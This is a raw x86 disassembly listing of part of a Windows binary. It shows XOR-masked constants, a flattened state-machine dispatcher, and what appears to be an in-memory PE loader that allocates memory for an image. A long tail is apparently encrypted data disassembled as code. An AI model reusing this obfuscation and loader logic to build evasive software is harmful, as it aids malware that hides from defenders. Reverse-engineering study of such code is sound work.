  41522b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415232:	xor    al,cl
  415234:	mov    ecx,DWORD PTR [ebp+0xc]
  415237:	mov    ecx,DWORD PTR [ecx]
  415239:	xor    ecx,edi
  41523b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415242:	or     al,cl
  415244:	mov    ecx,DWORD PTR [ebp-0xc]
  415247:	mov    ecx,DWORD PTR [ecx]
  415249:	xor    ecx,edi
  41524b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415252:	cmp    cl,al
  415254:	jne    0x41532e
  41525a:	mov    eax,DWORD PTR [ebp+0xc]
  41525d:	mov    eax,DWORD PTR [eax]
  41525f:	xor    eax,edi
  415261:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415268:	mov    ecx,DWORD PTR [ebp-0x10]
  41526b:	mov    ecx,DWORD PTR [ecx]
  41526d:	xor    ecx,edi
  41526f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415276:	xor    al,cl
  415278:	mov    ecx,DWORD PTR [ebp-0x14]
  41527b:	mov    ecx,DWORD PTR [ecx]
  41527d:	xor    ecx,edi
  41527f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415286:	or     al,cl
  415288:	mov    ecx,DWORD PTR [ebp-0x10]
  41528b:	mov    ecx,DWORD PTR [ecx]
  41528d:	xor    ecx,edi
  41528f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415296:	cmp    cl,al
  415298:	jne    0x41532e
  41529e:	mov    eax,DWORD PTR [ebp-0x14]
  4152a1:	mov    eax,DWORD PTR [eax]
  4152a3:	xor    eax,edi
  4152a5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	xor    ecx,edi
  4152b3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ba:	xor    al,cl
  4152bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4152bf:	mov    ecx,DWORD PTR [ecx]
  4152c1:	xor    ecx,edi
  4152c3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ca:	or     al,cl
  4152cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4152cf:	mov    ecx,DWORD PTR [ecx]
  4152d1:	xor    ecx,edi
  4152d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  4152da:	cmp    cl,al
  4152dc:	jne    0x41532e
  4152de:	mov    eax,DWORD PTR [ebp-0x14]
  4152e1:	mov    eax,DWORD PTR [eax]
  4152e3:	xor    eax,edi
  4152e5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4152ef:	mov    ecx,DWORD PTR [ecx]
  4152f1:	xor    ecx,edi
  4152f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152fa:	xor    al,cl
  4152fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4152ff:	mov    ecx,DWORD PTR [ecx]
  415301:	xor    ecx,edi
  415303:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  41530a:	or     al,cl
  41530c:	mov    ecx,DWORD PTR [ebp-0x14]
  41530f:	mov    ecx,DWORD PTR [ecx]
  415311:	xor    ecx,edi
  415313:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  41531a:	cmp    cl,al
  41531c:	jne    0x41532e
  41531e:	lea    eax,[ebp-0x4c]
  415321:	push   eax
  415322:	call   0x414de8
  415327:	mov    ecx,DWORD PTR [ebp-0x44]
  41532a:	cmp    eax,ecx
  41532c:	je     0x415338
  41532e:	mov    eax,DWORD PTR [ebp+0x8]
  415331:	xor    eax,edi
  415333:	add    eax,ebx
  415335:	mov    DWORD PTR [ebp+0x18],eax
  415338:	mov    eax,DWORD PTR [ebp-0x8]
  41533b:	xor    eax,edi
  41533d:	lea    eax,[eax+esi*1+0x3272dd]
  415344:	xor    eax,edi
  415346:	mov    ecx,DWORD PTR [ebp+0x8]
  415349:	mov    edx,DWORD PTR [ebp+0x18]
  41534c:	xor    ecx,edi
  41534e:	add    ecx,ebx
  415350:	cmp    edx,ecx
  415352:	je     0x41514f
  415358:	mov    eax,DWORD PTR [ebp+0x8]
  41535b:	mov    ecx,DWORD PTR [ebp+0x18]
  41535e:	xor    eax,edi
  415360:	add    eax,ebx
  415362:	cmp    ecx,eax
  415364:	jne    0x415377
  415366:	mov    eax,DWORD PTR [ebp-0x8]
  415369:	mov    ecx,DWORD PTR [ebp+0x1c]
  41536c:	xor    eax,edi
  41536e:	lea    eax,[eax+ecx*1+0x3272dd]
  415375:	jmp    0x4153ee
  415377:	push   0x18
  415379:	push   DWORD PTR [ebp-0x4]
  41537c:	lea    eax,[ebp-0x64]
  41537f:	push   eax
  415380:	call   0x414620
  415385:	mov    eax,DWORD PTR [ebp+0x8]
  415388:	mov    ecx,DWORD PTR [ebp-0x18]
  41538b:	xor    eax,edi
  41538d:	add    eax,ebx
  41538f:	cmp    eax,ecx
  415391:	je     0x4153a6
  415393:	mov    eax,DWORD PTR [ebp+0x8]
  415396:	xor    eax,edi
  415398:	add    eax,ebx
  41539a:	push   eax
  41539b:	push   0x18
  41539d:	lea    eax,[ebp-0x64]
  4153a0:	push   eax
  4153a1:	call   0x414b97
  4153a6:	mov    eax,DWORD PTR [ebp-0x4]
  4153a9:	add    eax,0x18
  4153ac:	mov    DWORD PTR [ebp+0x18],eax
  4153af:	push   DWORD PTR [ebp-0x50]
  4153b2:	push   DWORD PTR [ebp+0x18]
  4153b5:	mov    eax,DWORD PTR [ebp-0x54]
  4153b8:	add    eax,DWORD PTR [ebp-0x20]
  4153bb:	push   eax
  4153bc:	call   0x414620
  4153c1:	mov    eax,DWORD PTR [ebp+0x8]
  4153c4:	mov    ecx,DWORD PTR [ebp-0x18]
  4153c7:	xor    eax,edi
  4153c9:	add    eax,ebx
  4153cb:	cmp    eax,ecx
  4153cd:	je     0x4153e0
  4153cf:	push   0x0
  4153d1:	push   DWORD PTR [ebp-0x50]
  4153d4:	mov    eax,DWORD PTR [ebp-0x54]
  4153d7:	add    eax,DWORD PTR [ebp-0x20]
  4153da:	push   eax
  4153db:	call   0x414b97
  4153e0:	mov    eax,DWORD PTR [ebp-0x24]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x50]
  4153e6:	add    DWORD PTR [eax],ecx
  4153e8:	mov    eax,DWORD PTR [ebp-0x50]
  4153eb:	add    eax,DWORD PTR [ebp+0x1c]
  4153ee:	mov    DWORD PTR [ebp+0x1c],eax
  4153f1:	mov    eax,DWORD PTR [ebp-0x8]
  4153f4:	mov    ecx,DWORD PTR [ebp+0x1c]
  4153f7:	xor    eax,edi
  4153f9:	add    eax,ebx
  4153fb:	imul   eax,ecx
  4153fe:	mov    ecx,DWORD PTR [ebp+0x8]
  415401:	mov    edx,DWORD PTR [ebp-0x28]
  415404:	xor    ecx,edi
  415406:	lea    ecx,[ecx+edx*1+0x3272dd]
  41540d:	cmp    eax,ecx
  41540f:	jb     0x41506c
  415415:	mov    esi,DWORD PTR [ebp+0x14]
  415418:	mov    eax,DWORD PTR [ebp-0x20]
  41541b:	mov    DWORD PTR [esi],eax
  41541d:	jmp    0x415464
  41541f:	mov    ecx,DWORD PTR [ebp+0x8]
  415422:	mov    edx,DWORD PTR [ebp+0xc]
  415425:	xor    ecx,edi
  415427:	xor    edx,edi
  415429:	add    ecx,ebx
  41542b:	add    edx,ebx
  41542d:	cmp    ecx,edx
  41542f:	jne    0x415443
  415431:	mov    eax,ds:0x7f642d1c
  415436:	imul   eax,eax,0x9f15fcef
  41543c:	mov    ds:0x7f642d1c,eax
  415441:	jmp    0x415464
  415443:	mov    ecx,DWORD PTR [ebp+0x8]
  415446:	xor    ecx,edi
  415448:	add    ecx,ebx
  41544a:	cmp    eax,ecx
  41544c:	je     0x41545a
  41544e:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  415458:	jmp    0x415464
  41545a:	and    DWORD PTR ds:0x3343fa1c,0x5265ec3f
  415464:	pop    edi
  415465:	pop    esi
  415466:	pop    ebx
  415467:	leave  
  415468:	ret    0x18
  41546b:	push   ebp
  41546c:	mov    ebp,esp
  41546e:	and    esp,0xfffffff8
  415471:	mov    eax,DWORD PTR [ebp+0x20]
  415474:	sub    esp,0x14
  415477:	push   ebx
  415478:	mov    ebx,DWORD PTR [ebp+0x14]
  41547b:	push   esi
  41547c:	push   edi
  41547d:	cmp    eax,0xf89c85b5
  415482:	jne    0x41548e
  415484:	push   0xf89c85b2
  415489:	jmp    0x4155c0
  41548e:	mov    eax,DWORD PTR [ebp+0x20]
  415491:	cmp    eax,0xf89c85b2
  415496:	jne    0x4154a2
  415498:	push   0xf89c85b3
  41549d:	jmp    0x4155c0
  4154a2:	mov    eax,DWORD PTR [ebp+0x20]
  4154a5:	cmp    eax,0xf89c85b3
  4154aa:	jne    0x4154b6
  4154ac:	push   0xf89c85b0
  4154b1:	jmp    0x4155c0
  4154b6:	mov    eax,DWORD PTR [ebp+0x20]
  4154b9:	cmp    eax,0xf89c85b0
  4154be:	jne    0x4154ca
  4154c0:	push   0xf89c85b1
  4154c5:	jmp    0x4155c0
  4154ca:	mov    ecx,DWORD PTR [ebp+0x20]
  4154cd:	mov    eax,0xf89c85bc
  4154d2:	cmp    ecx,eax
  4154d4:	jne    0x415590
  4154da:	mov    eax,DWORD PTR [ebp+0x10]
  4154dd:	mov    DWORD PTR [esp+0xc],eax
  4154e1:	mov    eax,DWORD PTR [ebp+0x18]
  4154e4:	mov    DWORD PTR [esp+0x14],eax
  4154e8:	mov    eax,DWORD PTR [ebp+0xc]
  4154eb:	mov    DWORD PTR [esp+0x18],eax
  4154ef:	mov    eax,DWORD PTR [ebp+0x8]
  4154f2:	mov    DWORD PTR [esp+0x10],eax
  4154f6:	mov    eax,DWORD PTR [esp+0x10]
  4154fa:	mov    ecx,DWORD PTR [esp+0x14]
  4154fe:	mov    edi,0x7510896
  415503:	xor    eax,edi
  415505:	mov    esi,0x3272dd
  41550a:	add    eax,esi
  41550c:	mov    DWORD PTR [ecx],eax
  41550e:	mov    eax,DWORD PTR [esp+0xc]
  415512:	mov    eax,DWORD PTR [eax+0x194]
  415518:	mov    ecx,DWORD PTR [eax]
  41551a:	mov    eax,DWORD PTR [esp+0xc]
  41551e:	mov    eax,DWORD PTR [eax+0x194]
  415524:	mov    eax,DWORD PTR [eax]
  415526:	add    eax,DWORD PTR [ecx+0x3c]
  415529:	mov    ecx,DWORD PTR [esp+0xc]
  41552d:	mov    ecx,DWORD PTR [ecx+0x1d8]
  415533:	mov    ecx,DWORD PTR [ecx+0x14]
  415536:	push   0x4
  415538:	push   0x3000
  41553d:	push   DWORD PTR [eax+0x50]
  415540:	push   0x0
  415542:	call   ecx
  415544:	mov    DWORD PTR [ebx],eax
  415546:	mov    eax,DWORD PTR [esp+0x10]
  41554a:	push   DWORD PTR [esp+0xc]
  41554e:	xor    eax,edi
  415550:	add    eax,esi
  415552:	mov    DWORD PTR [esp+0x20],eax
  415556:	lea    eax,[esp+0x20]
  41555a:	push   eax
  41555b:	push   ebx
  41555c:	push   DWORD PTR [esp+0x20]
  415560:	push   DWORD PTR [esp+0x28]
  415564:	push   DWORD PTR [esp+0x24]
  415568:	call   0x414f2c
  41556d:	mov    eax,DWORD PTR [esp+0x10]
  415571:	mov    ecx,DWORD PTR [ebx]
  415573:	xor    eax,edi
  415575:	add    eax,esi
  415577:	cmp    ecx,eax
  415579:	je     0x4155d7
  41557b:	mov    eax,DWORD PTR [esp+0x18]
  41557f:	mov    ecx,DWORD PTR [esp+0x14]
  415583:	xor    eax,edi
  415585:	add    eax,esi
  415587:	imul   eax,DWORD PTR [esp+0x1c]
  41558c:	mov    DWORD PTR [ecx],eax
  41558e:	jmp    0x4155d7
  415590:	mov    ecx,DWORD PTR [ebp+0x20]
  415593:	cmp    ecx,0xf89c85b1
  415599:	jne    0x4155a2
  41559b:	push   0xf89c85be
  4155a0:	jmp    0x4155c0
  4155a2:	mov    ecx,DWORD PTR [ebp+0x20]
  4155a5:	cmp    ecx,0xf89c85be
  4155ab:	jne    0x4155b4
  4155ad:	push   0xf89c85bf
  4155b2:	jmp    0x4155c0
  4155b4:	mov    ecx,DWORD PTR [ebp+0x20]
  4155b7:	cmp    ecx,0xf89c85bf
  4155bd:	jne    0x4155d7
  4155bf:	push   eax
  4155c0:	push   DWORD PTR [ebp+0x1c]
  4155c3:	push   DWORD PTR [ebp+0x18]
  4155c6:	push   ebx
  4155c7:	push   DWORD PTR [ebp+0x10]
  4155ca:	push   DWORD PTR [ebp+0xc]
  4155cd:	push   DWORD PTR [ebp+0x8]
  4155d0:	call   0x41546b
  4155d5:	mov    DWORD PTR [ebx],eax
  4155d7:	mov    eax,DWORD PTR [ebx]
  4155d9:	pop    edi
  4155da:	pop    esi
  4155db:	pop    ebx
  4155dc:	mov    esp,ebp
  4155de:	pop    ebp
  4155df:	ret    0x1c
  4155e2:	push   ebp
  4155e3:	mov    ebp,esp
  4155e5:	sub    esp,0xc
  4155e8:	mov    eax,0xf89c85b5
  4155ed:	mov    DWORD PTR [ebp-0x8],eax
  4155f0:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  4155f7:	mov    ecx,DWORD PTR [ebp-0x8]
  4155fa:	xor    ecx,0x7510896
  415600:	add    ecx,0x3272dd
  415606:	mov    DWORD PTR [ebp-0x4],ecx
  415609:	mov    ecx,DWORD PTR [ebp+0xc]
  41560c:	push   eax
  41560d:	mov    DWORD PTR [ebp+0xc],ecx
  415610:	push   DWORD PTR [ebp+0xc]
  415613:	lea    eax,[ebp-0x4]
  415616:	push   DWORD PTR [ebp+0x8]
  415619:	push   eax
  41561a:	push   DWORD PTR [ebp+0xc]
  41561d:	push   DWORD PTR [ebp-0xc]
  415620:	push   DWORD PTR [ebp-0x8]
  415623:	call   0x41546b
  415628:	mov    DWORD PTR [ebp-0x4],eax
  41562b:	mov    eax,DWORD PTR [ebp-0x4]
  41562e:	leave  
  41562f:	ret    0x8
  415632:	mov    cl,0x27
  415634:	popa   
  415635:	test   bh,dh
  415637:	(bad)  
  415638:	cmc    
  415639:	aaa    
  41563a:	push   ss
  41563b:	shr    BYTE PTR [edi],0x1f
  41563e:	dec    edx
  41563f:	or     DWORD PTR [esi],edx
  415641:	in     al,dx
  415642:	jns    0x415618
  415644:	add    BYTE PTR [eax],al
  415646:	repz add al,0x0
  415649:	add    bh,ah
  41564b:	(bad)  
  41564c:	aad    0x3b
  41564e:	addr16 das 
  415650:	ror    BYTE PTR [eax+0x3c],1
  415653:	inc    ecx
  415654:	shl    DWORD PTR [ecx+0x349dc5bb],1
  41565a:	mov    bl,0x3d
  41565c:	sub    eax,0x9427a6c2
  415661:	sub    esi,edx
  415663:	and    eax,0x3f44dee
  415668:	xor    al,0x26
  41566a:	push   es
  41566b:	or     DWORD PTR ds:0xe8227491,0xffffffe5
  415672:	out    dx,eax
  415673:	test   al,0x42
  415675:	ja     0x415694
  415677:	enter  0xe8a0,0x11
  41567b:	push   esp
  41567c:	pop    esi
  41567d:	leave  
  41567e:	xor    al,0x84
  415680:	test   BYTE PTR [eax],dh
  415682:	cli    
  415683:	mov    bh,0x8e
  415686:	adc    eax,0x9f79c564
  41568b:	leave  
  41568c:	inc    edx
  41568d:	daa    
  41568e:	fisttp WORD PTR [ebx-0x7acc7f4b]
  415694:	popa   
  415695:	call   0xbd88:0x8bea2cdc
  41569c:	add    BYTE PTR [ecx+ecx*2-0x53e157bc],ch
  4156a3:	shr    al,cl
  4156a5:	add    BYTE PTR [ecx-0x78c774c7],ch
  4156ab:	mov    ch,0xa
  4156ad:	cmp    DWORD PTR [ecx],0x2ccdfcdc
  4156b3:	adc    eax,0x407d4a94
  4156b8:	xor    al,0x82
  4156ba:	pop    ebx
  4156bb:	shl    DWORD PTR [edx+0x58deff6c],1
  4156c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156c2:	and    DWORD PTR [edi+eax*2-0x39],ecx
  4156c6:	not    bl
  4156c8:	inc    ebx
  4156c9:	mov    edx,edx
  4156cb:	stos   BYTE PTR es:[edi],al
  4156cc:	pop    ss
  4156cd:	call   DWORD PTR [eax]
  4156cf:	loopne 0x4156bc
  4156d1:	sbb    al,0x6c
  4156d3:	sbb    al,0xa2
  4156d5:	xchg   DWORD PTR [eax-0x765513fa],edi
  4156db:	xor    BYTE PTR [ebp-0x12],dh
  4156de:	popa   
  4156df:	sub    DWORD PTR [eax],ecx
  4156e1:	mov    dh,0x7d
  4156e3:	sahf   
  4156e4:	pop    es
  4156e5:	into   
  4156e6:	sub    al,0x2
  4156e8:	ret    
  4156e9:	dec    esi
  4156ea:	xor    DWORD PTR [ebx+0x48045642],eax
  4156f0:	mov    gs:0xb747c11d,al
  4156f6:	add    BYTE PTR [edi-0x544ad0cf],ah
  4156fc:	ret    0xd2a5
  4156ff:	and    ecx,DWORD PTR [esi+ebx*1+0x43]
  415703:	sub    eax,0xdec33a6b
  415708:	xchg   ebx,eax
  415709:	jmp    0xd547116c
  41570e:	cmp    eax,0x15205507
  415713:	lahf   
  415714:	add    DWORD PTR [edx+0x5f4f67fb],ebx
  41571a:	mov    dl,0x88
  41571c:	jo     0x41572f
  41571e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41571f:	xchg   BYTE PTR [edx],ah
  415721:	sar    BYTE PTR [ebp-0x9c61a3b],cl
  415727:	lea    esi,[esi]
  415729:	mov    edi,0xda3a6eb4
  41572e:	aam    0x85
  415730:	mul    DWORD PTR [eax+0x6e]
  415733:	dec    ebp
  415734:	(bad)  
  415735:	xchg   edx,eax
  415736:	dec    DWORD PTR [ecx+0x757cc8d4]
  41573c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41573d:	inc    esp
  41573e:	ins    BYTE PTR es:[edi],dx
  41573f:	cmp    bh,BYTE PTR [edx+0x65]
  415742:	scas   eax,DWORD PTR es:[edi]
  415743:	outs   dx,DWORD PTR ds:[esi]
  415744:	ss scas eax,DWORD PTR es:[edi]
  415746:	into   
  415747:	mov    bl,0xcc
  415749:	loop   0x415794
  41574b:	pop    es
  41574c:	pop    ebp
  41574d:	test   BYTE PTR [ecx],0xf
  415750:	cdq    
  415751:	ror    ebx,0x5
  415754:	cmp    ch,BYTE PTR [ebx-0x4f42f7da]
  41575a:	push   es
  41575b:	xchg   DWORD PTR ds:0x907379af,edx
  415761:	mov    ah,0xbd
  415763:	int    0x35
  415765:	je     0x415723
  415767:	sete   BYTE PTR [edx]
  41576a:	stos   BYTE PTR es:[edi],al
  41576b:	fsubp  st(0),st
  41576d:	(bad)  
  41576e:	pop    ecx
  41576f:	test   DWORD PTR [esp+ecx*4+0x45],eax
  415773:	cmp    BYTE PTR [ecx+0xe],cl
  415776:	aam    0x5e
  415778:	mov    ds:0x4dc6382c,eax
  41577d:	jae    0x4157e5
  41577f:	and    BYTE PTR [edx+edx*8],0xb3
  415783:	mov    bl,0xf4
  415785:	aad    0xe9
  415787:	sar    eax,1
  415789:	xchg   BYTE PTR [ebx+0x2bd7ee51],bh
  41578f:	hlt    
  415790:	mov    bh,0x80
  415792:	out    0xff,eax
  415794:	mov    ds:0x3cc4b90a,al
  415799:	mov    cl,0x9d
  41579b:	fs inc edi
  41579d:	mov    bl,0x9c
  41579f:	aas    
  4157a0:	xor    bl,BYTE PTR [edi+eiz*4+0x4b]
  4157a4:	fwait
  4157a5:	js     0x415764
  4157a7:	pop    esi
  4157a8:	xchg   ebx,eax
  4157a9:	das    
  4157aa:	cwde   
  4157ab:	mov    al,0x25
  4157ad:	pop    ecx
  4157ae:	xchg   esi,eax
  4157af:	arpl   WORD PTR [ebp+0x13],di
  4157b2:	mov    BYTE PTR [ebp+esi*8-0x54],ch
  4157b6:	fs xchg ebx,eax
  4157b8:	mov    ds:0x92cc01a7,eax
  4157bd:	jnp    0x415794
  4157bf:	mov    dh,0x45
  4157c1:	retf   0xebb
  4157c4:	scas   al,BYTE PTR es:[edi]
  4157c5:	jle    0x41575c
  4157c7:	dec    esi
  4157c8:	mov    bh,0x7a
  4157ca:	in     eax,dx
  4157cb:	outs   dx,BYTE PTR ds:[esi]
  4157cc:	mov    al,BYTE PTR [edx+0x233f400d]
  4157d2:	push   esp
  4157d3:	push   0xffffffc1
  4157d5:	pusha  
  4157d6:	dec    edi
  4157d7:	enter  0x8c6a,0xcb
  4157db:	mov    al,dh
  4157dd:	jp     0x4157f0
  4157df:	cmp    ebx,DWORD PTR [edx-0x75]
  4157e2:	pop    ebx
  4157e3:	push   eax
  4157e4:	or     eax,0xb86a24e2
  4157e9:	shl    BYTE PTR [ebx],1
  4157eb:	pop    ebp
  4157ec:	imul   edi,edx,0xffffff89
  4157ef:	dec    eax
  4157f0:	ja     0x415853
  4157f2:	loope  0x4157e8
  4157f4:	rcl    BYTE PTR [ebp+ecx*1+0x3f227430],0x37
  4157fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157fd:	sbb    eax,0x10faf378
  415802:	add    BYTE PTR [ecx+0x27],ch
  415805:	sub    al,0x6e
  415807:	adc    DWORD PTR [esi],esi
  415809:	mov    al,BYTE PTR ds:0x39de7be
  41580f:	das    
  415810:	and    DWORD PTR [edi+0x61],ebx
  415813:	cmp    ch,BYTE PTR [ebp+0xd]
  415816:	jbe    0x4157fd
  415818:	clc    
  415819:	cli    
  41581a:	(bad)  
  41581b:	loopne 0x4157fd
  41581d:	mov    ch,0x40
  41581f:	add    eax,0x8ae4d1ce
  415824:	cli    
  415825:	stc    
  415826:	mov    eax,ds:0xe9268773
  41582b:	and    al,0x97
  41582d:	(bad)  
  41582e:	jmp    0x415812
  415830:	xor    DWORD PTR [esi],ebp
  415832:	adc    al,0xba
  415834:	bnd lock jle 0x415899
  415838:	out    0xc9,al
  41583a:	lods   eax,DWORD PTR ds:[esi]
  41583b:	lods   eax,DWORD PTR ds:[esi]
  41583c:	and    BYTE PTR [ecx],ah
  41583e:	and    DWORD PTR [esi],esi
  415840:	cli    
  415841:	leave  
  415842:	jle    0x4157c5
  415844:	lahf   
  415845:	fsub   QWORD PTR [ecx]
  415847:	fcom   QWORD PTR [eax]
  415849:	rcl    DWORD PTR [esi+0x7f],1
  41584c:	les    edi,FWORD PTR [ecx+esi*4+0x572a1dc3]
  415853:	add    eax,0x32f3908
  415858:	leave  
  415859:	(bad)  
  41585a:	mov    ds:0xd01f4bb,al
  41585f:	xchg   ebx,eax
  415860:	fisttp QWORD PTR [ecx+0x29]
  415863:	mov    esi,0x8c74f42
  415868:	pavgw  mm7,QWORD PTR [edx+0x3f]
  41586c:	into   
  41586d:	sbb    al,0x45
  41586f:	cmp    eax,0x9d5ad66b
  415874:	jmp    0xb990:0x6c4628d7
  41587b:	(bad)  
  41587c:	add    ecx,esi
  41587e:	mov    ds:0xdeb2acd3,eax
  415883:	jmp    0x6eec702b
  415888:	jae    0x415870
  41588a:	aaa    
  41588b:	loopne 0x4158fe
  41588d:	aad    0xef
  41588f:	out    0x65,eax
  415891:	ins    BYTE PTR es:[edi],dx
  415892:	xchg   edx,eax
  415893:	sub    esp,ebp
  415895:	imul   dh
  415897:	call   0x438f:0xbd21cb31
  41589e:	int    0x5a
  4158a0:	loope  0x4158c2
  4158a2:	jp     0x4158bd
  4158a4:	mov    DWORD PTR [ecx+eiz*2],edi
  4158a7:	pop    ebp
  4158a8:	adc    al,0x9
  4158aa:	dec    ecx
  4158ab:	xor    bh,ah
  4158ad:	cmp    BYTE PTR [edi+0x37164d1e],bl
  4158b3:	mov    ah,0xbb
  4158b5:	xchg   edi,eax
  4158b6:	cmc    
  4158b7:	push   cs
  4158b8:	das    
  4158b9:	mov    esp,0xdaf55b0b
  4158be:	ret    0x50ce
  4158c1:	repz enter 0x45a1,0xc8
  4158c6:	mov    WORD PTR [eax-0x22184e95],ds
  4158cc:	xor    esp,edx
  4158ce:	mov    bl,0xf1
  4158d0:	pop    ss
  4158d1:	inc    ebx
  4158d2:	sahf   
  4158d3:	mov    al,BYTE PTR [ecx+ebp*8+0x3c]
  4158d7:	jl     0x415940
  4158d9:	or     ecx,eax
  4158db:	dec    esp
  4158dc:	out    dx,eax
  4158dd:	ror    WORD PTR [ecx-0x28],cl
  4158e1:	push   cs
  4158e2:	sub    al,0xab
  4158e4:	pop    ebx
  4158e5:	pop    ss
  4158e6:	push   es
  4158e7:	sbb    DWORD PTR [ebp+0x15120cf3],esp
  4158ed:	sub    ecx,DWORD PTR [edi]
  4158ef:	add    BYTE PTR [edx-0x46],al
  4158f2:	ss nop
  4158f4:	cli    
  4158f5:	cmp    eax,0xa7c0d9eb
  4158fa:	push   edx
  4158fb:	push   cs
  4158fc:	jo     0x4158d4
  4158fe:	xor    eax,0xacb0b058
  415903:	pop    edi
  415904:	pop    ebp
  415905:	cmp    DWORD PTR [ebp-0x32363d1c],0x59
  41590c:	and    esp,esi
  41590e:	retf   
  41590f:	repnz push cs
  415911:	and    al,0xbc
  415913:	cmp    al,0xa6
  415915:	retf   0xb73e
  415918:	(bad)  
  41591a:	push   eax
  41591b:	lods   al,BYTE PTR ds:[esi]
  41591c:	lock icebp 
  41591e:	xchg   ebp,eax
  41591f:	pop    ebp
  415920:	jp     0x415975
  415922:	inc    ecx
  415923:	or     al,0x68
  415925:	push   esi
  415926:	je     0x415944
  415928:	adc    al,0xf6
  41592a:	outs   dx,BYTE PTR ds:[esi]
  41592b:	jge    0x415959
  41592d:	jmp    0x415962
  41592f:	and    DWORD PTR [edx-0x82a3652],0x20
  415936:	out    0x4,al
  415938:	aam    0x56
  41593a:	call   DWORD PTR [eax+0x6c]
  41593d:	sub    bh,BYTE PTR [esi+0x3]
  415940:	jb     0x4159a7
  415942:	fcmovbe st,st(0)
  415944:	push   ebx
  415945:	lea    esi,[eax]
  415947:	add    al,dl
  415949:	loope  0x415999
  41594b:	mov    al,0x7a
  41594d:	imul   BYTE PTR [eax]
  41594f:	jnp    0x4159cb
  415951:	cmp    eax,ecx
  415953:	dec    ecx
  415954:	push   ss
  415955:	xor    DWORD PTR [esi-0x4b],esi
  415958:	xor    al,0x5a
  41595a:	add    ch,BYTE PTR [ebx-0x21]
  41595d:	adc    DWORD PTR [esi+0x504cb542],ebp
  415963:	or     DWORD PTR [edi+0x2c],ecx
  415966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415967:	aas    
  415968:	repz aam 0x89
  41596b:	aad    0xd5
  41596d:	add    eax,0xe2f4e788
  415972:	retf   
  415973:	sbb    al,BYTE PTR [ebp+0x3ebd51f]
  415979:	sub    dh,BYTE PTR [eax-0x16]
  41597c:	sbb    DWORD PTR [ecx-0x7f37d002],0xbf2c6493
  415986:	mov    DWORD PTR [ebx-0x45],ebx
  415989:	cmp    al,0x26
  41598b:	xchg   ebp,eax
  41598c:	arpl   WORD PTR [ecx-0xd0a2361],ax
  415992:	jl     0x4159f5
  415994:	pop    ss
  415995:	in     eax,dx
  415996:	mov    bh,0xd5
  415998:	jmp    0x415a18
  41599a:	jae    0x415997
  41599c:	test   eax,0xc208fa4a
  4159a1:	xchg   BYTE PTR [ebx+0x700628c4],bl
  4159a7:	adc    BYTE PTR [edi+0x1a],dh
  4159aa:	cmp    dl,cl
  4159ac:	sahf   
  4159ad:	(bad)  
  4159ae:	fcom   DWORD PTR [ecx]
  4159b0:	mov    ebx,0xe77aab19
  4159b5:	dec    ebx
  4159b6:	mov    edx,DWORD PTR [esi]
  4159b8:	call   0x263068dc
  4159bd:	or     DWORD PTR [ecx-0xca44431],edi
  4159c3:	and    eax,0x2c794dd2
  4159c8:	sub    DWORD PTR [edi],ecx
  4159ca:	call   0x7bb23f1c
  4159cf:	mov    edx,0xe2d74c53
  4159d4:	pop    esp
  4159d5:	ss xchg edi,eax
  4159d7:	xchg   edx,eax
  4159d8:	pop    ds
  4159d9:	in     eax,0xb4
  4159db:	add    ecx,edx
  4159dd:	inc    ebx
  4159de:	loopne 0x4159af
  4159e0:	into   
  4159e1:	xchg   ecx,edi
  4159e3:	mov    al,0x7d
  4159e5:	and    edx,0x23
  4159e8:	ret    0xa12
  4159eb:	out    dx,eax
  4159ec:	cs mov dl,0x56
  4159ef:	xchg   eax,ebp
  4159f1:	mov    bl,0x81
  4159f3:	int3   
  4159f4:	(bad)  
  4159f5:	fisttp WORD PTR [edx+0x4b]
  4159f8:	jae    0x415a1a
  4159fa:	vpcmpgtb ymm0,ymm5,ymm6
  4159fe:	adc    eax,DWORD PTR [esi-0x3f]
  415a01:	lea    edx,[eax+0x10]
  415a04:	mov    ah,0xb8
  415a06:	rcl    BYTE PTR [esi],0xb0
  415a09:	out    dx,al
  415a0a:	cdq    
  415a0b:	pop    ecx
  415a0c:	jo     0x4159ad
  415a0e:	ins    DWORD PTR es:[edi],dx
  415a0f:	fwait
  415a10:	push   ss
  415a11:	dec    ebp
  415a12:	pop    eax
  415a13:	jnp    0x415a1f
  415a15:	inc    edx
  415a16:	sub    al,BYTE PTR [ebp+0xd211aa6]
  415a1c:	in     eax,0x4b
  415a1e:	lea    edx,[eax+esi*8-0x43]
  415a22:	clc    
  415a23:	xor    eax,0x2d9df481
  415a28:	mov    dh,0x2d
  415a2a:	inc    edx
  415a2b:	adc    eax,DWORD PTR [edx]
  415a2d:	or     bh,0x6c
  415a30:	xchg   ebx,eax
  415a31:	daa    
  415a32:	fadd   QWORD PTR [ecx-0x5ee11b3f]
  415a38:	adc    al,0x66
  415a3a:	xor    ebx,eax
  415a3c:	push   ebp
  415a3d:	xchg   DWORD PTR [eax-0x21],ecx
